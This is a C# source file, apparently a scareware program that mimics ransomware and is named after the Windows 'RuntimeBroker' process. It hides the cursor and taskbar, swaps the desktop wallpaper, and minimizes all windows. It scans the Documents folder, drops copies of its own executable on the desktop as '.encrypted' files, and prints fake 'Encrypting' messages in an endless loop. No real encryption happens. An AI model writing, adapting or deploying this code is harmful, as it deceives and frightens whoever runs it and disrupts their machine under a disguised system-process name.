using System.Reflection;
using System.Runtime.InteropServices;

namespace RuntimeBroker
{
    internal partial class Program
    {
        [LibraryImport("user32.dll", EntryPoint = "SystemParametersInfoW", StringMarshalling = StringMarshalling.Utf16)]
        private static partial int SystemParametersInfo(UInt32 uiAction, UInt32 uiParam, String pvParam, UInt32 fWinIni);

        [LibraryImport("user32.dll", EntryPoint = "FindWindowA", SetLastError = true, StringMarshalling = StringMarshalling.Utf16)]
        private static partial IntPtr FindWindow(string lpClassName, string lpWindowName);

        [LibraryImport("user32.dll", EntryPoint = "SendMessageA", SetLastError = true)]
        private static partial IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);

        [LibraryImport("user32.dll", EntryPoint = "SetWindowPos", SetLastError = true)]
        private static partial int SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

        [LibraryImport("user32.dll", EntryPoint = "ShowCursor")]
        private static partial int ShowCursor([MarshalAs(UnmanagedType.Bool)] bool bShow);

        private static readonly uint SPI_SETDESKWALLPAPER = 20;
        private static readonly uint SPIF_UPDATEINIFILE = 0x1;

        private const int WM_COMMAND = 0x111;
        private const int MIN_ALL = 419;

        [Flags]
        private enum SetWindowPosFlags : uint
        {
            HideWindow = 128,
            ShowWindow = 64
        }

        private static void WriteResourceToFile(string resourceName, string fileName)
        {
            using var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);
            using var file = new FileStream(fileName, FileMode.Create, FileAccess.Write);
            resource?.CopyTo(file);
        }

        private static void CallSieFun()
        {
            ShowCursor(false);

            var window = FindWindow("Shell_traywnd", "");
            _ = SetWindowPos(window, IntPtr.Zero, 0, 0, 0, 0, (uint)SetWindowPosFlags.HideWindow);

            var filePath = Path.GetTempFileName();

            WriteResourceToFile("RuntimeBroker.wallpaper.jpg", filePath);

            _ = SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, filePath, SPIF_UPDATEINIFILE);

            var lHwnd = FindWindow("Shell_TrayWnd", "");
            _ = SendMessage(lHwnd, WM_COMMAND, MIN_ALL, IntPtr.Zero);
        }

        private static void CopySieFiles(string[] files)
        {
            var desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            var currentBytes = File.ReadAllBytes(Environment.ProcessPath ?? Path.GetRandomFileName());

            foreach (var docFile in files.Take(20))
            {
                File.WriteAllBytes(Path.Combine(desktopPath, new FileInfo(docFile).Name) + ".encrypted", currentBytes);
            }
        }

        private static void EncryptSieFiles(string[] files)
        {
            while (true)
            {
                foreach (var file in files)
                {
                    Console.WriteLine($"Encrypting {file}...");
                }
            }
        }

        static void Main(string[] args)
        {
            Console.BackgroundColor = ConsoleColor.Red;
            Console.ForegroundColor = ConsoleColor.White;

            Console.Clear();

            Console.WriteLine("Disabling Protections...");
            CallSieFun();

            Console.WriteLine("Enumerating sie files...");

            var docs = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "*.*", SearchOption.AllDirectories);

            if (docs == null)
            {
                Console.WriteLine("Failed to get sie files list...");

                return;
            }

            Console.WriteLine($"{docs.Length} were found for encryption...");

            CopySieFiles(docs);

            EncryptSieFiles(docs);
        }
    }
}